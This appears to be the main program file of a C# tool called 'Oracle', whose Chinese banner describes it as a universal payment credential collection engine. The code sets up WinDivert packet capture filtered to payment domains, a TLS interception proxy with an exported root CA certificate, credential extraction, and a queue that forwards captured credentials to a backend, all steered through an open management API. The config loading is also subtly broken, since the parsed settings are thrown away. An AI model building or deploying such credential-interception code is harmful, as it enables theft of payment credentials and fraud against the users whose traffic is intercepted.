using System.Text.Json;
using Oracle.Capture;
using Oracle.Extractor;
using Oracle.Http;
using Oracle.Shared;
using Oracle.Tls;

// ── Startup time ──────────────────────────────────────

var _startTime = DateTime.UtcNow;

// ── Configuration ──────────────────────────────────────

var configPath = Path.Combine(
    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
    "Oracle", "config.json");

var config = new OracleConfig();
if (File.Exists(configPath))
{
    var json = File.ReadAllText(configPath);
    JsonSerializer.Deserialize<OracleConfig>(json);
}

// Override from command line args
for (int i = 0; i < args.Length; i++)
{
    if (args[i] == "--api-port" && i + 1 < args.Length)
        config.ApiPort = int.Parse(args[++i]);
    if (args[i] == "--tls-port" && i + 1 < args.Length)
        config.TlsProxyPort = int.Parse(args[++i]);
    if (args[i] == "--backend" && i + 1 < args.Length)
        config.BackendUrl = args[++i];
}

// ── Services ──────────────────────────────────────────

var credQueue = new CredentialQueue(config);
var connTracker = new ConnectionTracker(config);
var packetFilter = new PacketFilter(config.PayDomains);
var certMgr = new CertificateManager(config);
var httpParser = new HttpParser();
var extractor = new CredentialExtractor(httpParser);
var ruleEngine = new Oracle.Extractor.RuleEngine();

// Try WinDivert driver first, fall back to mock
var captureDriver = CreateCaptureDriver();

static ICaptureDriver CreateCaptureDriver()
{
    try
    {
        var driver = new WinDivertDriver();
        // Don't Open() here - CaptureService.Start() handles that after subscribing events
        Console.WriteLine("[Oracle] ✅ WinDivert driver created (will open on capture start)");
        return driver;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[Oracle] ⚠️ WinDivert unavailable: {ex.Message}");
        return new MockCaptureDriver();
    }
}
var captureService = new CaptureService(config, connTracker, packetFilter, captureDriver);
var tlsProxy = new TlsProxy(config, certMgr, credQueue, ruleEngine);

// ── ASP.NET Core Minimal API ──────────────────────────

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls($"http://{config.ApiBindAddress}:{config.ApiPort}");

// Disable HTTPS redirection (we're running behind the scenes)
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
        policy.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader());
});

var app = builder.Build();
app.UseCors();

// Health / Status
app.MapGet("/status", () =>
{
    var uptime = DateTime.UtcNow - _startTime;
    return Results.Ok(new
    {
        status = captureService.IsRunning ? "running" : "stopped",
        version = "1.0.0",
        uptime_seconds = uptime.TotalSeconds,
        packets_captured = captureService.PacketsCaptured,
        packets_filtered = captureService.PacketsFiltered,
        active_connections = connTracker.ActiveCount,
        active_tls_sessions = tlsProxy.ActiveConnections,
        total_connections = tlsProxy.TotalConnections,
        credentials_queued = credQueue.TotalEnqueued,
        credentials_sent = credQueue.TotalSent,
        credentials_failed = credQueue.TotalFailed,
    });
});

// Start capture
app.MapPost("/start", () =>
{
    captureService.Start();
    tlsProxy.Start();
    return Results.Ok(new { status = "started" });
});

// Stop capture
app.MapPost("/stop", () =>
{
    captureService.Stop();
    tlsProxy.Stop();
    return Results.Ok(new { status = "stopped" });
});

// Stats
app.MapGet("/stats", () =>
{
    return Results.Ok(new
    {
        capture = new
        {
            packets_captured = captureService.PacketsCaptured,
            packets_filtered = captureService.PacketsFiltered,
            evicted_connections = connTracker.EvictedCount,
            active_connections = connTracker.ActiveCount,
        },
        tls_proxy = new
        {
            active_sessions = tlsProxy.ActiveConnections,
            total_connections = tlsProxy.TotalConnections,
            failed_connections = tlsProxy.FailedConnections,
        },
        credentials = new
        {
            queued = credQueue.PendingCount,
            total_enqueued = credQueue.TotalEnqueued,
            total_sent = credQueue.TotalSent,
            total_failed = credQueue.TotalFailed,
        },
    });
});

// Active connections list
app.MapGet("/connections", () =>
{
    var conns = connTracker.GetActiveConnections()
        .Select(c => new
        {
            key = c.Key.ToString(),
            state = c.State.ToString(),
            sni = c.Sni,
            created_ago = (DateTime.UtcNow - c.CreatedAt).TotalSeconds,
            idle_ago = (DateTime.UtcNow - c.LastActivity).TotalSeconds,
        })
        .Take(100)
        .ToList();

    return Results.Ok(new { count = conns.Count, connections = conns });
});

// Config
app.MapGet("/config", () => Results.Ok(config));
app.MapPut("/config", (OracleConfig newConfig) =>
{
    var dir = Path.GetDirectoryName(configPath)!;
    Directory.CreateDirectory(dir);
    File.WriteAllText(configPath, JsonSerializer.Serialize(newConfig));
    return Results.Ok(new { status = "saved" });
});

// Manual credential injection (for testing)
app.MapPost("/inject", (Credential cred) =>
{
    _ = credQueue.EnqueueAsync(cred);
    return Results.Ok(new { status = "queued", id = cred.Id });
});

// ── Startup ──────────────────────────────────────────

Console.WriteLine($@"
╔══════════════════════════════════════════════╗
║          神谕 (Oracle) v1.0                 ║
║    万能支付凭证采集引擎                       ║
╠══════════════════════════════════════════════╣
║  Management API  : http://{config.ApiBindAddress}:{config.ApiPort}  ║
║  TLS Proxy      : 127.0.0.1:{config.TlsProxyPort}             ║
║  Python Backend : {config.BackendUrl,-36}║
║  Pay Domains    : {config.PayDomains.Length,-4} domains          ║
╚══════════════════════════════════════════════╝");

// Export root CA certificate for browser trust
app.MapGet("/cert", () =>
{
    try
    {
        var derData = certMgr.ExportRootCaCert();
        return Results.File(derData, "application/x-x509-ca-cert", "oracle_root_ca.cer");
    }
    catch (Exception ex)
    {
        return Results.Problem(ex.Message);
    }
});

app.Run();

// ── Mock driver for development ──────────────────────

public class MockCaptureDriver : ICaptureDriver
{
    public event Action<CapturedPacket>? OnPacketCaptured;

    public void Open(int queueLen = 8192) { }
    public void Close() { }
    public bool Read(out CapturedPacket packet) { packet = null!; return false; }
    public void Send(CapturedPacket packet) { }
    public void Dispose() { }
}
